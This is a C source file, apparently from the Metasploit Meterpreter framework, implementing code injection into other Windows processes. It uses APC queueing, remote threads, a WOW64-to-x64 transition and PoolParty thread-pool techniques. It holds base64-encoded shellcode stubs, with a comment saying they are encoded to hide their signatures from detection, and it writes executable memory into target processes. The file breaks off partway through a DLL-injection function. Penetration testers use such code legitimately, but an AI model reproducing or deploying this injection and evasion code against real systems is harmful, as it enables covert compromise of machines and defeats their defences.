#include "metsrv.h"
#include "base_inject.h"
#include "remote_thread.h"
#include "pool_party.h"
#include "load_library_r.h"
#include "util_b64.h"
#include <tlhelp32.h>

// The shellcode stubs below are stored base64-encoded so their raw byte
// signatures don't appear in the compiled binary. They are decoded on
// demand via b64_decode() at each use site.

// see '/msf/external/source/shellcode/windows/x86/src/migrate/executex64.asm'
// 03.06.2017: fixed an elusive bug on AMD CPUs, http://blog.rewolf.pl/blog/?p=1484
//             found and fixed by ReWolf, incorporated by RaMMicHaeL
static const char migrate_executex64_b64[] =
	"VYnlVleLdQiLTQzoAAAAAFiDwCuD7AiJ4sdCBDMAAACJAugPAAAAZozYZo7Qg8QUX15dwggAizzk"
	"/ypIMcBX/9ZfUMdEJAQjAAAAiTwk/ywk";

// see '/msf/external/source/shellcode/windows/x64/src/migrate/remotethread.asm'
static const char migrate_wownativex_b64[] =
	"/EiJzkiJ50iD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxh"
	"fAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJ"
	"AdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESL"
	"QBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XU0xyUFRSI1GGFD/"
	"dhD/dghBUUFRSbgBAAAAAAAAAEgx0kiLDkG6yDikQP/VSIXAdAxIuAAAAAAAAAAA6wpIuAEAAAAA"
	"AAAASIPEUEiJ/MM=";

// see '/msf/external/source/shellcode/windows/x86/src/migrate/apc.asm'
static const char apc_stub_x86_b64[] =
	"/It0JARVieXoiQAAAGCJ5THSZItSMItSDItSFItyKA+3SiYx/zHArDxhfAIsIMHPDQHH4vBSV4tS"
	"EItCPAHQi0B4hcB0SgHQUItIGItYIAHT4zxJizSLAdYx/zHArMHPDQHHOOB19AN9+Dt9JHXiWItY"
	"JAHTZosMS4tYHAHTiwSLAdCJRCQkW1thWVpR/+BYX1qLEuuGW4B+EAB1O8ZGEAFoppW9nf/TPAZ8"
	"GjHJZItBGDmIqAEAAHUMjZPPAAAAiZCoAQAAMclRUf92CP82UVFoOGgNFv/TycIMAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAA==";

// see '/msf/external/source/shellcode/windows/x64/src/migrate/apc.asm'
static const char apc_stub_x64_b64[] =
	"/IB5EAAPhRMBAADGQRABSIPseOjIAAAAQVFBUFJRVkgx0mVIi1JgSItSGEiLUiBIi3JQSA+3SkpN"
	"MclIMcCsPGF8AiwgQcHJDUEBweLtUkFRSItSIItCPEgB0GaBeBgLAnVyi4CIAAAASIXAdGdIAdBQ"
	"i0gYRItAIEkB0ONWSP/JQYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18UwDTCQIRTnRddhYRItAJEkB"
	"0GZBiwxIRItAHEkB0EGLBIhIAdBBWEFYXllaQVhBWUFaSIPsIEFS/+BYQVlaSIsS6U////9dSDHS"
	"ZUiLQjBIOZDIAgAAdQ5IjZUHAQAASImQyAIAAEyLAUyLSQhIMclIMdJRUUG6OGgNFv/VSIHEqAAA"
	"AMMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

// see '/msf/external/source/shellcode/windows/x64/src/migrate/poolparty.asm'
static const char poolparty_stub_x64_b64[] =
	"/FVXVkiJ5+kBAQAAXkiD7HjoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJ"
	"SDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItI"
	"GESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBm"
	"QYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XYtOEEgx"
	"0v/KQboIhx1g/9VIMdJMiwZMi04ISDHJUVFBujhoDRb/1UiJ/F5fXcPo+v7//w==";

// see '/msf/external/source/shellcode/windows/x86/src/migrate/poolparty.asm'
static const char poolparty_stub_x86_b64[] =
	"VVNXVonm/Om9AAAAXWr//3MQaAiHHWD/1TH/V1f/cwj/M1dXaDhoDRb/1Yn0Xl9bXcPo1f///2CJ"
	"5THSZItSMItSDItSFItyKA+3SiYx/zHArDxhfAIsIMHPDQHHSXXvUleLUhCLQjwB0ItAeIXAdEwB"
	"0FCLSBiLWCAB04XJdDxJizSLAdYx/zHArMHPDQHHOOB19AN9+Dt9JHXgWItYJAHTZosMS4tYHAHT"
	"iwSLAdCJRCQkW1thWVpR/+BYX1qLEuuDW+hp////6PX///8=";

// wow64->x64 trampoline: mov rax, rcx; shl rcx, 32; shr rcx, 32; shr rax, 32; jmp rax
static const char wow64_apc_trampoline_b64[] = "SInISMHhIEjB6SBIwegg/+A=";

/*
 * Attempt to gain code execution in the remote process via a call to ntdll!NtQueueApcThread
 * Note: Windows Server 2008R2 can blue screen if you use APC injection to inject into another sessions csrss.exe
 */
DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter )
{
	DWORD dwResult                     = ERROR_ACCESS_DENIED;
	HANDLE hThreadSnap                 = NULL;
	LPVOID lpApcStub                   = NULL;
	LPVOID lpRemoteApcStub             = NULL;
	LPVOID lpRemoteApcContext          = NULL;
	LIST * thread_list                 = NULL;
	THREADENTRY32 t                    = {0};
	APCCONTEXT ctx                     = {0};
	DWORD dwApcStubLength              = 0;
	size_t stApcStubDecoded            = 0;

	do
	{
		thread_list = list_create();
		if( !thread_list )
			break;

		ctx.s.lpStartAddress = lpStartAddress;
		ctx.p.lpParameter    = lpParameter;
		ctx.bExecuted        = FALSE;

		t.dwSize = sizeof( THREADENTRY32 );

		// Get the architecture specific apc migration stub...
		if( dwDestinationArch == PROCESS_ARCH_X86 )
		{
			if( dwMeterpreterArch == PROCESS_ARCH_X64 )
			{
				// injecting x64->x86(wow64)
				
				// Our injected APC ends up running in native x64 mode within the wow64 process and as such 
				// will need a modified stub to transition to wow64 before execuing the apc_stub_x86 stub.

				// This issue does not effect x64->x86 injection using the kernel32!CreateRemoteThread method though.
				
				SetLastError( ERROR_ACCESS_DENIED );
				BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Can't do x64->x86 APC injection yet." )
			}
			else
			{
				// injecting x86->x86
				lpApcStub = b64_decode( apc_stub_x86_b64, &stApcStubDecoded );
				if( !lpApcStub )
					BREAK_WITH_ERROR( "[INJECT] inject_via_apcthread: b64_decode apc_stub_x86 failed", ERROR_OUTOFMEMORY );
				dwApcStubLength = (DWORD)stApcStubDecoded;
			}
		}
		else if( dwDestinationArch == PROCESS_ARCH_X64 )
		{
			// injecting x64->x64 (and the same stub for x86(wow64)->x64)
			lpApcStub = b64_decode( apc_stub_x64_b64, &stApcStubDecoded );
			if( !lpApcStub )
				BREAK_WITH_ERROR( "[INJECT] inject_via_apcthread: b64_decode apc_stub_x64 failed", ERROR_OUTOFMEMORY );
			dwApcStubLength = (DWORD)stApcStubDecoded;

			if( dwMeterpreterArch == PROCESS_ARCH_X86 )
			{
				// injecting x86(wow64)->x64

				// For now we leverage a bug in wow64 to get x86->x64 injection working, this
				// will simply fail gracefully on systems where the technique does not work.

				MEMORY_BASIC_INFORMATION mbi = {0};
				LPVOID lpRemoteAddress       = NULL;
				BYTE * lpNopSled             = NULL;
				BYTE * bStub                 = NULL;
				size_t stStubLen             = 0;
				
				/*
					// On Windows 2003 x64 there is a bug in the implementation of NtQueueApcThread for wow64 processes.
					// The call from a wow64 process to NtQueueApcThread to inject an APC into a native x64 process is sucessful, 
					// however the start address of the new APC in the native x64 process is not what we specify but instead it is
					// the address of the wow64.dll export wow64!Wow64ApcRoutine as found in the wow64 process! We can simple VirtualAlloc
					// this address (No ASLR on Windows 2003) and write a simple NOP sled which will jump to our real APC. From there
					// injection will continue as normal.

					// The registers on the native x64 process after the queued APC is attempted to run:
					rip = 000000006B0095F0                             // address of wow64!Wow64ApcRoutine as found in the wow64 process
					rcx = ( dwApcRoutine << 32 ) | dwApcRoutineContext // (our start address and param)
					rdx = dwApcStatusBlock                             // unused
					r8  = dwApcReserved                                // unused

					// On the WOW64 process side:
					wow64:000000006B0095F0 ; Exported entry   3. Wow64ApcRoutine
					wow64:000000006B0095F0
					wow64:000000006B0095F0	public Wow64ApcRoutine

					// On the native x64 process side:
					ntdll:0000000077EF30A0 public KiUserApcDispatcher
					ntdll:0000000077EF30A0	mov     rcx, [rsp]    // 32bit dwApcRoutine and 32bit dwApcRoutineContext into 64bit value
					ntdll:0000000077EF30A4	mov     rdx, [rsp+8]  // 32bit dwApcStatusBlock
					ntdll:0000000077EF30A9	mov     r8, [rsp+10h] // 32bit dwApcReserved
					ntdll:0000000077EF30AE	mov     r9, rsp
					ntdll:0000000077EF30B1	call    qword ptr [rsp+18h] // <--- we call the other processes wow64 address for wow64!Wow64ApcRoutine!

					// Our bStub:
					00000000  4889C8            mov rax, rcx
					00000003  48C1E120          shl rcx, 32
					00000007  48C1E920          shr rcx, 32
					0000000B  48C1E820          shr rax, 32
					0000000F  FFE0              jmp rax
				*/

				// alloc the address of the wow64!Wow64ApcRoutine export in the remote process...
				// TO-DO: parse the PE64 executable wow64.dll to get this at runtime.
				lpRemoteAddress = met_api->win_api.kernel32.VirtualAllocEx( hProcess, (LPVOID)0x6B0095F0, 8192, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
				if( !lpRemoteAddress )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx 0x6B0095F0 failed" );

				if( met_api->win_api.kernel32.VirtualQueryEx( hProcess, lpRemoteAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION) ) == 0 )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualQueryEx failed" );

				lpNopSled = (BYTE *)malloc( mbi.RegionSize );
				if( !lpNopSled )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: malloc lpNopSled failed" );

				memset( lpNopSled, 0x90, mbi.RegionSize );

				if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed" )

				bStub = b64_decode( wow64_apc_trampoline_b64, &stStubLen );
				if( !bStub )
					BREAK_WITH_ERROR( "[INJECT] inject_via_apcthread: b64_decode wow64_apc_trampoline failed", ERROR_OUTOFMEMORY );

				if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - stStubLen), bStub, stStubLen, NULL ) )
				{
					free( bStub );
					free( lpNopSled );
					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed" )
				}

				free( bStub );
				free( lpNopSled );
			}
		}
		else
		{
			SetLastError( ERROR_BAD_ENVIRONMENT );
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Invalid target architecture" )
		}

		hThreadSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
		if( !hThreadSnap )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed" )

		if( !met_api->win_api.kernel32.Thread32First( hThreadSnap, &t ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Thread32First failed" )
		
		// Allocate memory for the apc stub and context
		lpRemoteApcStub = met_api->win_api.kernel32.VirtualAllocEx( hProcess, NULL, dwApcStubLength + sizeof(APCCONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !lpRemoteApcStub )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx failed" )

		// Simply determine the apc context address
		lpRemoteApcContext = ( (BYTE *)lpRemoteApcStub + dwApcStubLength );

		dprintf( "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwMeterpreterArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );

		// Write the apc stub to memory...
		if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed" )

		// Write the apc context to memory...
		if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed" )

		do
		{
			HANDLE hThread = NULL;

			// Only proceed if we are targeting a thread in the target process
			if( t.th32OwnerProcessID != dwProcessID )
				continue;

			// Open a handle to this thread so we can do the apc injection
			hThread = met_api->win_api.kernel32.OpenThread( THREAD_ALL_ACCESS, FALSE, t.th32ThreadID );
			if( !hThread )
				continue;

			dprintf("[INJECT] inject_via_apcthread: Trying to inject into thread %d", t.th32ThreadID );

			// Only inject into threads we can suspend to avoid synchronization issue whereby the new metsrv will attempt 
			// a connection back but the client side will not be ready to accept it and we loose the session.
			if( met_api->win_api.kernel32.SuspendThread( hThread ) != (DWORD)-1 )
			{
				list_push( thread_list, hThread );

				// Queue up our apc stub to run in the target thread, when our apc stub is run (when the target 
				// thread is placed in an alertable state) it will spawn a new thread with our actual migration payload.
				// Any successfull call to NtQueueApcThread will make migrate_via_apcthread return ERROR_SUCCESS.
				if( met_api->win_api.ntdll.ZwQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
				{
					dprintf("[INJECT] inject_via_apcthread: ZwQueueApcThread for thread %d Succeeded.", t.th32ThreadID );
					dwResult = ERROR_SUCCESS;
				}
				else
				{
					dprintf("[INJECT] inject_via_apcthread: ZwQueueApcThread for thread %d Failed.", t.th32ThreadID );
				}
			}
			else
			{
				met_api->win_api.kernel32.CloseHandle( hThread );
			}
			
			// keep searching for more target threads to inject our apc stub into...

		} while( met_api->win_api.kernel32.Thread32Next( hThreadSnap, &t ) );

	} while( 0 );

	if( dwResult == ERROR_SUCCESS && remote && response )
	{
		// We should only run this block if we are being used for migration...

		// Send a successful response to let the ruby side know that we've pretty
		// much successfully migrated and have reached the point of no return
		packet_add_tlv_uint( response, TLV_TYPE_MIGRATE_TECHNIQUE, MIGRATE_TECHNIQUE_APCQUEUE );
		packet_transmit_response( ERROR_SUCCESS, remote, response );

		// Sleep to give the remote side a chance to catch up...
		met_api->win_api.kernel32.Sleep( 2000 );
	}

	if( thread_list )
	{
		// Resume all the threads which we queued our apc into as the remote
		// client side will now be ready to handle the new conenction.
		while( TRUE )
		{
			HANDLE t = (HANDLE)list_pop( thread_list );
			if( !t )
				break;
			met_api->win_api.kernel32.ResumeThread( t );
			met_api->win_api.kernel32.CloseHandle( t );
		}

		list_destroy( thread_list );
	}

	if( hThreadSnap )
		met_api->win_api.kernel32.CloseHandle( hThreadSnap );

	SetLastError( dwResult );

	return dwResult;
}

/*
 * Attempt to gain code execution in a native x64 process from a wow64 process by transitioning out of the wow64 (x86)
 * enviroment into a native x64 enviroment and accessing the native win64 API's.
 * Note: On Windows 2003 the injection will work but in the target x64 process issues occur with new 
 *       threads (kernel32!CreateThread will return ERROR_NOT_ENOUGH_MEMORY). Because of this we filter out
 *       Windows 2003 from this method of injection, however the APC injection method will work on 2003.
 */
DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE * pThread )
{
	DWORD dwResult           = ERROR_SUCCESS;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;
	OSVERSIONINFO os         = {0};
	BYTE * pExecStub         = NULL;
	BYTE * pWowStub          = NULL;
	size_t stExecStubLen     = 0;
	size_t stWowStubLen      = 0;

	do
	{
		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: GetVersionEx failed" )

		// filter out Windows 2003
		if ( os.dwMajorVersion == 5 && os.dwMinorVersion == 2 )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: Windows 2003 not supported." )
		}

		// decode the base64-encoded stubs
		pExecStub = b64_decode( migrate_executex64_b64, &stExecStubLen );
		if( !pExecStub )
			BREAK_WITH_ERROR( "[INJECT] inject_via_remotethread_wow64: b64_decode migrate_executex64 failed", ERROR_OUTOFMEMORY );

		pWowStub = b64_decode( migrate_wownativex_b64, &stWowStubLen );
		if( !pWowStub )
			BREAK_WITH_ERROR( "[INJECT] inject_via_remotethread_wow64: b64_decode migrate_wownativex failed", ERROR_OUTOFMEMORY );

		// alloc a RWX buffer in this process for the EXECUTEX64 function
		pExecuteX64 = (EXECUTEX64)met_api->win_api.kernel32.VirtualAlloc( NULL, stExecStubLen, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !pExecuteX64 )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed" )

		// alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
		pX64function = (X64FUNCTION)met_api->win_api.kernel32.VirtualAlloc( NULL, stWowStubLen + sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( !pX64function )
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed" )

		// copy over the wow64->x64 stub
		memcpy( pExecuteX64, pExecStub, stExecStubLen );

		// copy over the native x64 function
		memcpy( pX64function, pWowStub, stWowStubLen );

		// set the context
		ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + stWowStubLen );

		ctx->h.hProcess       = hProcess;
		ctx->s.lpStartAddress = lpStartAddress;
		ctx->p.lpParameter    = lpParameter;
		ctx->t.hThread        = NULL;

		dprintf( "[INJECT] inject_via_remotethread_wow64: pExecuteX64=0x%08X, pX64function=0x%08X, ctx=0x%08X", pExecuteX64, pX64function, ctx );

		// Transition this wow64 process into native x64 and call pX64function( ctx )
		// The native function will use the native Win64 API's to create a remote thread in the target process.
		if( !pExecuteX64( pX64function, (DWORD)(DWORD_PTR)ctx ) )
		{
			SetLastError( ERROR_ACCESS_DENIED );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed" )
		}

		if( !ctx->t.hThread )
		{
			SetLastError( ERROR_INVALID_HANDLE );
			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: ctx->t.hThread is NULL" )
		}

		// Success! grab the new thread handle from of the context
		*pThread = ctx->t.hThread;

		dprintf( "[INJECT] inject_via_remotethread_wow64: Success, hThread=0x%08X", ctx->t.hThread );

	} while( 0 );

	if( pExecuteX64 )
		met_api->win_api.kernel32.VirtualFree( pExecuteX64, 0, MEM_DECOMMIT );

	if( pX64function )
		met_api->win_api.kernel32.VirtualFree( pX64function, 0, MEM_DECOMMIT );

	if( pExecStub )
		free( pExecStub );

	if( pWowStub )
		free( pWowStub );

	return dwResult;
}

/*
 * Attempte to gain code execution in the remote process by creating a remote thread in the target process.
 */
DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter)
{
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREAD;
	HANDLE hThread = NULL;

	do
	{
		// Create the thread in the remote process. Create suspended in case the call to CreateRemoteThread
		// fails, giving us a chance to try an alternative method or fail migration gracefully.
		hThread = create_remote_thread(hProcess, 1024 * 1024, lpStartAddress, lpParameter, CREATE_SUSPENDED, NULL);
		if (!hThread)
		{
			if (dwMeterpreterArch == PROCESS_ARCH_X86 && dwDestinationArch == PROCESS_ARCH_X64)
			{
				dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREADWOW64;

				if (inject_via_remotethread_wow64(hProcess, lpStartAddress, lpParameter, &hThread) != ERROR_SUCCESS)
				{
					BREAK_ON_ERROR("[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed")
				}
			}
			else
			{
				BREAK_ON_ERROR("[INJECT] inject_via_remotethread: CreateRemoteThread failed")
			}
		}
		else
		{
			dprintf("[INJECT] inject_via_remotethread: succeeded");
		}

		if (remote && response)
		{
			dprintf("[INJECT] inject_via_remotethread: Sending a migrate response...");
			// Send a successful response to let the ruby side know that we've pretty
			// much successfully migrated and have reached the point of no return
			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
			packet_transmit_response(ERROR_SUCCESS, remote, response);

			dprintf("[INJECT] inject_via_remotethread: Sleeping for two seconds...");
			// Sleep to give the remote side a chance to catch up...
			met_api->win_api.kernel32.Sleep(2000);
		}

		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
		// Resume the injected thread...
		if (met_api->win_api.kernel32.ResumeThread(hThread) == (DWORD)-1)
		{
			BREAK_ON_ERROR("[INJECT] inject_via_remotethread: ResumeThread failed")
		}

	} while (0);

	if (hThread)
	{
		met_api->win_api.kernel32.CloseHandle(hThread);
	}

	SetLastError(dwResult);

	return dwResult;
}

DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter) {
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTechnique = MIGRATE_TECHNIQUE_POOLPARTY;
	HANDLE hThread = NULL;
	LPVOID lpPoolPartyStub;
	POOLPARTYCONTEXT ctx = { 0 };
	ctx.s.lpStartAddress = lpStartAddress;
	ctx.p.lpParameter = lpParameter;
	HANDLE hTriggerEvent = INVALID_HANDLE_VALUE;
	HANDLE hRemoteTriggerEvent = INVALID_HANDLE_VALUE;

	LPVOID lpStub = NULL;
	DWORD dwStubSize = 0;
	size_t stStubDecoded = 0;
	HANDLE hHeap = met_api->win_api.kernel32.GetProcessHeap();
	

	if (!supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch)) {
		return ERROR_INVALID_FUNCTION;
	}

	POOLPARTY_INJECTOR *poolparty = GetOrInitPoolParty(dwMeterpreterArch, dwDestinationArch);

	do
	{
		if(poolparty == NULL)
		{
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] The pool party could not be initialized", ERROR_INVALID_FUNCTION);
		}

		if (dwDestinationArch == PROCESS_ARCH_X64 && (dwMeterpreterArch == PROCESS_ARCH_X64 || dwMeterpreterArch == PROCESS_ARCH_X86)) {
			dprintf("[INJECT][inject_via_poolparty] using: poolparty_stub_x64");
			lpStub = b64_decode(poolparty_stub_x64_b64, &stStubDecoded);
			if (!lpStub) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] b64_decode poolparty_stub_x64 failed", ERROR_OUTOFMEMORY);
			}
			dwStubSize = (DWORD)stStubDecoded;
		}
		else if (dwDestinationArch == PROCESS_ARCH_X86 && dwMeterpreterArch == PROCESS_ARCH_X86) {
			dprintf("[INJECT][inject_via_poolparty] using: poolparty_stub_x86");
			lpStub = b64_decode(poolparty_stub_x86_b64, &stStubDecoded);
			if (!lpStub) {
				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] b64_decode poolparty_stub_x86 failed", ERROR_OUTOFMEMORY);
			}
			dwStubSize = (DWORD)stStubDecoded;
		}
		else {
			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_INVALID_FUNCTION);
		}

		hTriggerEvent = met_api->win_api.kernel32.CreateEventA(NULL, TRUE, FALSE, NULL);
		if (!hTriggerEvent)
		{
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
		}

		// Duplicate the event handle for the target process
		if (!met_api->win_api.kernel32.DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
		}

		lpPoolPartyStub = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
		if (!lpPoolPartyStub) {
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!");
		}
		
		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!");
		}

		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
		}

		dwResult = ERROR_INVALID_FUNCTION; // Set a default failure
		for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
			if (poolparty->variants[variant].isInjectionSupported) {
#ifdef DEBUGTRACE
				char* VARIANT_POS_TO_STR[POOLPARTY_TECHNIQUE_COUNT] = {
					"POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION",
					"POOLPARTY_TECHNIQUE_WORKER_FACTORY_OVERWRITE",
				};
				dprintf("[INJECT][inject_via_poolparty] Attempting injection with variant %s", VARIANT_POS_TO_STR[variant]);
#endif
				dwResult = poolparty->variants[variant].handler(hProcess, dwDestinationArch, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent);
				if (dwResult == ERROR_SUCCESS) {
					dprintf("[INJECT] inject_via_poolparty: injected!");
					break;
				}
			}
		}
		if (dwResult != ERROR_SUCCESS) {
			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_INVALID_FUNCTION)
		}

		if (remote && response)
		{
			dprintf("[INJECT] inject_via_poolparty: Sending a migrate response...");
			// Send a successful response to let the ruby side know that we've pretty
			// much successfully migrated and have reached the point of no return
			packet_add_tlv_uint(response, TLV_TYPE_MIGRATE_TECHNIQUE, dwTechnique);
			packet_transmit_response(ERROR_SUCCESS, remote, response);

			dprintf("[INJECT] inject_via_poolparty: Sleeping for two seconds...");
			// Sleep to give the remote side a chance to catch up...
			met_api->win_api.kernel32.Sleep(2000);

		}
		met_api->win_api.kernel32.SetEvent(hTriggerEvent);
		SetLastError(dwResult);
		met_api->win_api.kernel32.CloseHandle(hTriggerEvent);

	} while (0);

	if (lpStub) {
		free(lpStub);
	}

	return dwResult;
}

/*
 * Inject a DLL image into a process via Reflective DLL Injection.
 *
 * Note: You must inject a DLL of the correct target process architecture, (e.g. a PE32 DLL for 
 *       an x86 (wow64) process or a PE64 DLL for an x64 process). The wrapper function ps_inject_dll()
 *       in stdapi will handle this automatically.
 *
 * Note: GetReflectiveLoaderOffset() has a limitation of currently not being able to work for PE32 DLL's 
 *       in a native x64 meterpereter due to compile time assumptions, however GetReflectiveLoaderOffset() 
 *       will check for this and fail gracefully.
 *
 * Note: This function largely depreciates LoadRemoteLibraryR().
 * 
 * @param dwPid The process to inject into.
 * @param dwDestinationArch The arechitecture of the process to inject into. If this value is PROCESS_ARCH_UNKNOWN, then
 *        dwMeterpreterArch is used.
 * @param lpDllBuffer The DLL buffer to inject into the process. The DLL architecture must match the target PID.
 * @param dwDllLength The length in bytes of the DLL buffer.
 * @param reflectiveLoader The reflective loader function to call.
 * @param lpArg The argument to pass to the reflective loader function. See stArgSize for details.
 * @param stArgSize The size in bytes of lpArg. If this value is non-zero, it specifies the number of bytes that are
 *        copied into the target process. If this value is zero, then the value of lpArg is passed directly to the
 *        target and must be set to a valid address within the target process.
 */


DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, DWORD dwActualReflectiveLoaderOffset, LPVOID lpArg, SIZE_T stArgSize)
{
	DWORD dwResult = ERROR_ACCESS_DENIED;
	LPVOID lpRemoteArg = NULL;
	HANDLE hProcess = NULL;
	LPVOID lpRemoteLibraryBuffer = NULL;
	LPVOID lpReflectiveLoader = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	BOOL bPoolParty = supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch);
	do
	{
		if (!lpDllBuffer || !dwDllLength)
			BREAK_WITH_ERROR("[INJECT] inject_dll. No Dll buffer supplied.", ERROR_INVALID_PARAMETER);
		if (dwDestinationArch == PROCESS_ARCH_UNKNOWN)
			dwDestinationArch = dwMeterpreterArch;

		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpDllBuffer, reflectiveLoader);
		if(dwActualReflectiveLoaderOffset != 0) {
